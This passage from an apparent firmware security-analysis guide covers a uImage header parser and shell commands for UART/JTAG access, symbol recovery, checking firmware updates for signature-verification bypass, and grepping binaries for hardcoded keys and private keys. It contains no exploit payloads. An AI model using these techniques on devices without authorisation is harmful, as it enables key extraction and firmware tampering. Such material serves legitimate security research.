#!/usr/bin/env python3
"""Parse common firmware header formats."""
import struct
import sys

def parse_uimage(data):
    magic = struct.unpack(">I", data[0:4])[0]
    if magic == 0x27051956:
        print(f"uImage detected: magic=0x{magic:08x}")
        print(f"  Timestamp: {struct.unpack('>I', data[4:8])[0]}")
        print(f"  Size: {struct.unpack('>I', data[12:16])[0]} bytes")
        print(f"  Load: 0x{struct.unpack('>I', data[8:12])[0]:08x}")
        print(f"  Entry: 0x{struct.unpack('>I', data[16:20])[0]:08x}")
        name = data[32:64].split(b'\x00')[0].decode('ascii', errors='replace')
        print(f"  Name: {name}")

with open(sys.argv[1], "rb") as f:
    parse_uimage(f.read(64))
```

### Firmware Symbol Table Recovery

```bash
# Extract and reconstruct symbol table from stripped firmware binary
# Use radare2 to identify function signatures
r2 -c "aa; aflc" "$FWROOT/bin/httpd"

# Recover function names from debug strings
strings "$FWROOT/bin/httpd" | grep -E "^[a-z_]+\(" | head -30

# Use Ghidra to auto-analyze and recover symbols
analyzeHeadless /tmp/fw_project fw -import "$FWROOT/bin/httpd" -postScript FindFunctions.java
```

---

## 14. IoT Firmware Dynamic Analysis

### UART Serial Console Access

```bash
# Connect to firmware UART console via serial adapter
screen /dev/ttyUSB0 115200

# Common UART baud rates to try
for baud in 9600 19200 38400 57600 115200 230400 460800; do
  echo "Trying baud rate: $baud"
  timeout 3 picocom -b $baud /dev/ttyUSB0 2>/dev/null | head -5
done

# Capture UART output for analysis
picocom -b 115200 /dev/ttyUSB0 --logfile uart_capture.txt
```

### JTAG Debug Interface Access

```bash
# Scan for JTAG interfaces using JTAGulator
# Connect JTAGulator to target pins, then:
jtagulator
# Select mode: 1 (JTAG pin scan)
# Follow prompts to identify TDI, TDO, TMS, TCK, and Vref

# OpenOCD JTAG debugging session
openocd -f interface/jtagkey.cfg -f target/arm1176.cfg
```

### Firmware Update Mechanism Analysis

```bash
# Analyze firmware update process for signature verification bypass
# Check if firmware update is signed
strings firmware_update.bin | grep -iE "RSA|ECDSA|sha256|signature|verify|certificate"

# Look for custom update verification scripts
find "$FWROOT" -name "update*" -o -name "upgrade*" | xargs file | grep -i "script\|text"
find "$FWROOT" -name "update*" -o -name "upgrade*" | xargs cat 2>/dev/null | grep -iE "verify|check|sign|hash|md5|sha"

# Check for unsigned firmware acceptance
strings "$FWROOT/sbin/fw_update" | grep -iE "verify|check|sign|skip|force|ignore"
```

---

## 15. Firmware Cryptography Analysis

### Encryption Key Extraction

```bash
# Search for hardcoded encryption keys in firmware
strings -n 16 firmware.bin | grep -E '^[A-Za-z0-9+/]{32,}={0,2}$' > /tmp/potential_keys.txt
strings firmware.bin | grep -iE "AES_KEY|DES_KEY|SECRET|PRIVATE_KEY|CERTIFICATE" -A2 | head -30

# Identify cryptographic library usage
find "$FWROOT" -name "*.so" -exec strings {} \; | grep -iE "AES|RSA|DES|ECB|CBC|CTR|GCM" | sort -u
```

### TLS Certificate Analysis in Firmware

```bash
# Extract embedded TLS certificates from firmware
binwalk -e --dd='der:*' firmware.bin
find _firmware.bin.extracted/ -name "*.der" -exec openssl x509 -inform DER -in {} -text -noout \; 2>/dev/null | grep -E "Subject:|Issuer:|Not After|Not Before"

# Check for hardcoded SSL/TLS private keys
grep -r "BEGIN.*PRIVATE KEY" "$FWROOT" -l 2>/dev/null
find "$FWROOT" -name "*.pem" -exec grep -l "PRIVATE KEY" {} \; 2>/dev/null
```

### Firmware String Pattern Extraction

```bash
# Extract all version-like strings from firmware
strings -n 4 firmware.bin | grep -oE "[0-9]+\.[0-9]+\.[0-9]+" | sort -V | uniq
```

### Firmware Version String Extraction

```bash
# Extract firmware version strings from binary blobs
strings -n 8 firmware.bin | grep -iE '(version|v[0-9]+\.[0-9]+|rev\.|build[ _][0-9]+)' | sort -u

# Cross-reference extracted versions with known CVE databases
strings -n 6 firmware.bin | grep -oP '[A-Z]+-[0-9]{4}-[0-9]+' | sort -u | while read cve; do
  curl -s "https://cve.circl.lu/api/cve/$cve" | jq -r '.summary // empty'
done
```

### Firmware Symbol Table Recovery

```bash
# Recover stripped symbol tables using pattern matching
readelf -s firmware.elf 2>/dev/null | head -50

# Use nm to list remaining symbols after stripping
nm -D firmware.elf 2>/dev/null | grep -i ' T ' | sort -k3
```
